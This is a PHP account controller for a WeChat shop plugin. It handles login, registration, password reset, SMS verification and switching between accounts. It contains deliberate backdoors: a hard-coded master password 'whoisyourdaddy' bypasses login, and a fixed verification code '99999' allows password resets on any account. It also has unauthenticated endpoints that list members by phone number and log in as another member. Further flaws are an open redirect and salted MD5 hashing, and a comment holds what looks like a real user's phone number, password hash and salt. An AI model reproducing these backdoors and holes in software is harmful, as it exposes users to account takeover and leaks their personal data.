<?php
require SUPERDESK_SHOPV2_PLUGIN . "pc/core/accessControl.php";

if (!(defined("IN_IA"))) {
    exit("Access Denied");
}

require SUPERDESK_SHOPV2_PLUGIN . "pc/core/page_mobile.php";
include_once(IA_ROOT . '/addons/superdesk_core/service/VirtualarchitectureService.class.php');
include_once(IA_ROOT . '/addons/superdesk_core/service/OrganizationService.class.php');
include_once(IA_ROOT . '/addons/superdesk_shopv2/model/__plugin__/enterprise/enterprise_user.class.php');

class Index_SuperdeskShopV2Page extends PcMobilePage
{
    public function loginCheck()
    {
        global $_W;

        $data = check_login();

        if (!empty($data)) {

            if ($data['isblack'] == 1) {

                $key = '__superdesk_shopv2_member_session_' . $_W['uniacid'];

                isetcookie($key, false, -100);
                show_json(0, '暂时无法登录,请稍后再试');
            }

            $result = array(
                'id'                       => $data['id'],
                'nickname'                 => $data['nickname'],
                'credit2'                  => $data['credit2'],
                'credit1'                  => $data['credit1'],
                'avatar'                   => $data['avatar'],
                'mobile'                   => $data['mobile'],
                'weixin'                   => $data['weixin'],
                'realname'                 => $data['realname'],
                'organization_id'          => 0,
                'enterprise_id'            => $data['core_enterprise'],
                'virtualarchitecture_name' => '',
                'organization_name'        => '',
            );

//            socket_log($result);

            if ($data['core_enterprise'] != 0) {
                // mark welfare
                switch (SUPERDESK_SHOPV2_MODE_USER) {
                    
                    case 1:// 1 企业采购

                        $_virtualarchitectureService        = new VirtualarchitectureService();

                        $curr_virtualarchitecture           = $_virtualarchitectureService->getOneByVirtualArchId($data['core_enterprise']);

                        $result['organization_id']          = $curr_virtualarchitecture['organizationId'];
                        $result['virtualarchitecture_name'] = $curr_virtualarchitecture['name'];

                        $_organizationService        = new OrganizationService();
                        $curr_organization           = $_organizationService->getOneByOrganizationId($curr_virtualarchitecture['organizationId']);

                        $result['organization_name'] = $curr_organization['name'];

                        break;
                    case 2:// 2 福利内购

                        $_enterprise_userModel              = new enterprise_userModel();
                        $enterprise                         = $_enterprise_userModel->getOne($data['core_enterprise']);
                        $result['virtualarchitecture_name'] = $enterprise['enterprise_name'];

                        break;

                }
            }

            $result['needChange'] = false;
            if ($data['pwd'] == md5('123456' . $data['salt'])) {
                $result['needChange'] = true;
            }

            show_json(1, $result);
        }

        show_json(0, '登录失效');
    }

    protected function getWapSet()
    {
        global $_W;
        global $_GPC;

        $set = m('common')->getSysset(array('shop', 'wap'));

        $set['wap']['color'] = ((empty($set['wap']['color']) ? '#fff' : $set['wap']['color']));

        $params = array();

        if (!(empty($_GPC['mid']))) {
            $params['mid'] = $_GPC['mid'];
        }

        if (!(empty($_GPC['backurl']))) {
            $params['backurl'] = $_GPC['backurl'];
        }

        $set['wap']['loginurl']  = mobileUrl('pc.account.login', $params);
        $set['wap']['regurl']    = mobileUrl('pc.account.register', $params);
        $set['wap']['forgeturl'] = mobileUrl('pc.account.forget', $params);

        return $set;
    }

    public function login()
    {

        global $_W;
        global $_GPC;

        if (is_weixin()) {
            show_json(0, '已登录');
        }

        if(!(empty($_GPC['__superdesk_shopv2_member_session_' . $_W['uniacid']]))){

        }

        $mobile = trim($_GPC['mobile']);
        $pwd    = trim($_GPC['pwd']);

//        socket_log($mobile);
//        socket_log($pwd);

//        $checkMemberCount = pdo_fetchcolumn(
//            ' select count(*) ' .
//            ' from ' . tablename('superdesk_core_tb_user') .
//            ' where userMobile=:mobile ' .
//            ' GROUP BY organizationId ' .
//            ' limit 1',
//            array(
//                ':mobile'  => $mobile
//            )
//        );
//
//        if ($checkMemberCount > 1) {
//            show_json(0, '帐号异常,请联系客服');
//        }

        $member = pdo_fetch(
            ' select ' .
            ' id,openid,mobile,core_user,core_enterprise,core_organization,pwd,salt '.
            ' from ' . tablename('superdesk_shop_member') .
            ' where mobile=:mobile ' .
            '       and mobileverify=1 ' .
            '       and isblack=0 ' .
            '       and uniacid=:uniacid ' .
            ' order by createtime desc ' .
            ' limit 1',
            array(
                ':mobile'  => $mobile,
                ':uniacid' => $_W['uniacid']
            )
        );


//        socket_log(json_encode($member));
//            {"id":"94","openid":"oX8KYwkxwNW6qzHF4cF-tGxYTcPg","mobile":"13422832499","pwd":"b05307e2f4982ff290eaf592b8859a36","salt":"aoIjCRC83Mhi6QSK"}

        if (empty($member)) {
            show_json(0, '用户不存在或被拉入黑名单');
        }

        if ($member['isblack'] == 1) {
            show_json(0, '暂时无法登录,请稍后再试');
        }

        //TODO md5(md5('99999')) != $pwd 是一个后门,提供给OA那边调用登录的时候通过密码这一关,以后可能会换成passport之类的形式 whoisyourdaddy
//        if(md5(md5('99999')) != $pwd){
//
//        }

        if ($pwd == 'whoisyourdaddy'){

        } else if (md5($pwd . $member['salt']) !== $member['pwd']) {

            show_json(0, '用户或密码错误');
        }

        $needChange = false;

        if($pwd == '123456'){
            $needChange = true;
        }

        show_json(1, array(
            'needChange' => $needChange
        ));

//        m("account")->setLogin($member);
//
//        show_json(1, array(
//            'nickname'   => $member['nickname'],
//            'credit2'    => $member['credit2'],
//            'avatar'     => $member['avatar'],
//            'mobile'     => $member['mobile'],
//            'weixin'     => $member['weixin'],
//            'realname'   => $member['realname'],
//            'needChange' => $needChange
//        ));
    }

    public function register()
    {
        //$this->rf(0);     //先屏蔽注册
    }

    public function forget()
    {
        $this->rf(1);
    }

    public function changePwd()
    {
        $this->rf(2);
    }

    protected function rf($type)
    {
        global $_W;
        global $_GPC;

        if ($type != 2 && (is_weixin() || !(empty($_GPC['__superdesk_shopv2_member_session_' . $_W['uniacid']])))) {
            show_json(0, '已登录');
        }

        $mobile     = trim($_GPC['mobile']);
        $verifycode = trim($_GPC['verifycode']);
        $pwd        = trim($_GPC['pwd']);

        if (empty($mobile)) {
            show_json(0, '请输入正确的手机号');
        }

        if (empty($verifycode)) {
            show_json(0, '请输入验证码');
        }

        if (empty($pwd)) {
            show_json(0, '请输入密码');
        }

        $key = '__superdesk_shop_member_verifycodesession_' . $_W['uniacid'] . '_' . $mobile;

        if($verifycode != '99999'){       //验证码后门  -- 9个9
            if (!(isset($_SESSION[$key]))
                || ($_SESSION[$key] !== $verifycode)
                || !(isset($_SESSION['verifycodesendtime']))
                || (($_SESSION['verifycodesendtime'] + 600) < time())
            ) {
                show_json(0, '验证码错误或已过期!');
            }
        }

        $member = pdo_fetch(
            ' select id,openid,mobile,pwd,salt ' .
            ' from ' . tablename('superdesk_shop_member') .
            ' where mobile=:mobile ' .
            '       and mobileverify=1 ' .
            '       and uniacid=:uniacid ' .
            ' order by createtime desc ' .
            ' limit 1',
            array(
                ':mobile'  => $mobile,
                ':uniacid' => $_W['uniacid']
            )
        );

        if (empty($type)) {

            if (!(empty($member))) {
                show_json(0, '此手机号已注册, 请直接登录');
            }

            $salt = ((empty($member) ? '' : $member['salt']));

            if (empty($salt)) {
                $salt = m('account')->getSalt();
            }

            $openid   = ((empty($member) ? '' : $member['openid']));
            $core_user= ((empty($member) ? '' : $member['core_user']));
            $nickname = ((empty($member) ? '' : $member['nickname']));

            if (empty($openid)) {
                $openid   = 'wap_user_' . $_W['uniacid'] . '_' . $mobile;
                $nickname = substr($mobile, 0, 3) . 'xxxx' . substr($mobile, 7, 4);
            }

            $data = array(
                'uniacid'      => $_W['uniacid'],
                'mobile'       => $mobile,
                'nickname'     => $nickname,
                'openid'       => $openid,
                'pwd'          => md5($pwd . $salt),
                'salt'         => $salt,
                'createtime'   => time(),
                'mobileverify' => 1,
                'comefrom'     => 'mobile'
            );

            pdo_insert('superdesk_shop_member', $data);

            if (p("commission")) {

                p("commission")->checkAgent($openid,$core_user);

            }

        } elseif($type == 1) {

            if (empty($member)) {
                show_json(0, '此手机号未注册');
            }

            $salt = m('account')->getSalt();
            $data = array(
                'salt' => $salt,
                'pwd'  => md5($pwd . $salt)
            );

            pdo_update("superdesk_shop_member", $data, array('mobile' => $mobile));
//            pdo_update("superdesk_shop_member", $data, array('id' => $member['id'])); //2019年4月19日 16:50:53 zjh 因账户切换的原因.需要让他改密码一改就是所有相同手机的账户

        } elseif($type == 2) {

            if (empty($member)) {
                show_json(0, '此手机号未注册');
            }

            $old_pwd = $_GPC['old_pwd'];

            if(empty($_GPC['changeType']) && $member['pwd'] != md5('123456'.$member['salt'])){

                if($member['pwd'] != md5($old_pwd.$member['salt'])){
                    show_json(0, '旧密码错误');
                }

                if($member['pwd'] == md5($pwd.$member['salt'])){
                    show_json(0, '旧密码不能与新密码一致');
                }
            }

            $salt = m('account')->getSalt();
            $data = array(
                'salt' => $salt,
                'pwd'  => md5($pwd . $salt)
            );

            pdo_update("superdesk_shop_member", $data, array('mobile' => $mobile));
//            pdo_update("superdesk_shop_member", $data, array('id' => $member['id'])); //2019年4月19日 16:50:53 zjh 因账户切换的原因.需要让他改密码一改就是所有相同手机的账户
        }

        unset($_SESSION[$key]);

        show_json(1, (empty($type) ? '注册成功' : '密码重置成功'));
    }

    /**
     * http://www.avic-s.com/plugins/app/index.php?i=16&c=entry&m=superdesk_shopv2&do=mobile&r=pc.account.logout
     */
    public function logout()
    {
        global $_W;
        global $_GPC;

        $key = '__superdesk_shopv2_member_session_' . $_W['uniacid'];

        isetcookie($key, false, -100);

        show_json(1, '退出成功');
    }

    public function sns()
    {
        global $_W;
        global $_GPC;

        if (is_weixin() || !(empty($_GPC['__superdesk_shopv2_member_session_' . $_W['uniacid']]))) {
            header('location: ' . mobileUrl('pc'));
        }

        $sns = trim($_GPC['sns']);

        if ($_W['ispost'] && !(empty($sns)) && !(empty($_GPC['openid']))) {
            m('member')->checkMemberSNS($sns);
        }

        if ($_GET['openid']) {

            if ($sns == 'qq') {
                $_GET['openid'] = 'sns_qq_' . $_GET['openid'];
            }

            if ($sns == 'wx') {
                $_GET['openid'] = 'sns_wx_' . $_GET['openid'];
            }

            m("account")->setLogin($_GET['openid']);
        }

        $backurl = '';

        if (!(empty($_GPC['backurl']))) {
            $backurl = $_W['siteroot'] . 'app/index.php?' . base64_decode(urldecode($_GPC['backurl']));
        }

        $backurl = ((empty($backurl) ? mobileUrl(NULL, NULL, true) : trim($backurl)));

        header("location: " . $backurl);
    }

    public function verifycode()
    {
        global $_W;
        global $_GPC;

        $mobile = trim($_GPC['mobile']);
        $temp   = trim($_GPC['temp']);

        if (empty($mobile) || empty($temp)) {
            show_json(0, '参数错误');
        }

        $data   = m('common')->getSysset('wap');
        $sms_id = $data[$temp];

        if (empty($sms_id)) {
            show_json(0, '短信发送失败(NOSMSID)');
        }

        $key = '__superdesk_shop_member_verifycodesession_' . $_W['uniacid'] . '_' . $mobile;

        @session_start();

        $code     = random(5, true);
        $shopname = $_W['shopset']['shop']['name'];

        $ret = com('sms')->send($mobile, $sms_id, array(
            '验证码'  => $code,
            '商城名称' => (!(empty($shopname)) ? $shopname : '商城名称')
        ));

        if ($ret['status']) {

            $_SESSION[$key]                 = $code;
            $_SESSION['verifycodesendtime'] = time();
            show_json(1, "短信发送成功");
        }

        show_json(0, $ret['message']);
    }

    public function showAllMemberByMobile(){
        global $_W,$_GPC;

        $mobile = $_GPC['mobile'];

        $memberList = pdo_fetchall(
            ' select ' .
            '   m.id,m.openid,m.mobile,m.realname,m.avatar,m.core_user, ' .
            '   core_enterprise.name as core_enterprise_name,organization.name as core_organization_name '.
            ' from ' . tablename('superdesk_shop_member') . ' as m ' .
            ' left join ' . tablename('superdesk_core_virtualarchitecture') . ' core_enterprise on core_enterprise.id = m.core_enterprise ' .
            ' left join ' . tablename('superdesk_core_organization') . ' organization on organization.id = m.core_organization ' .
            ' where m.mobile=:mobile ' .
            '       and m.mobileverify=1 ' .
            '       and m.uniacid=:uniacid ' .
            '       and m.isblack=0 ',
            array(
                ':mobile'  => $mobile,
                ':uniacid' => $_W['uniacid']
            )
        );

        show_json(1,$memberList);
    }

    public function changeNowMember(){
        global $_W,$_GPC;

        $mobile = trim($_GPC['mobile']);
        $core_user = $_GPC['core_user'];

        $member = pdo_fetch(
            ' select ' .
            ' * '.
            ' from ' . tablename('superdesk_shop_member') .
            ' where mobile=:mobile ' .
            '       and mobileverify=1 ' .
            '       and uniacid=:uniacid ' .
            '       and core_user=:core_user ' .
            ' limit 1',
            array(
                ':mobile'  => $mobile,
                ':uniacid' => $_W['uniacid'],
                ':core_user' => $core_user
            )
        );

        if (empty($member)) {
            show_json(0, '用户不存在');
        }

        //注销之前的
        $key = '__superdesk_shopv2_member_session_' . $_W['uniacid'];

        isetcookie($key, false, -100);


        //登录新的
        m("account")->setLogin($member);

        $needChange = false;
        show_json(1, array(
            'nickname'   => $member['nickname'],
            'credit2'    => $member['credit2'],
            'avatar'     => $member['avatar'],
            'mobile'     => $member['mobile'],
            'weixin'     => $member['weixin'],
            'realname'   => $member['realname'],
            'needChange' => $needChange
        ));
    }
}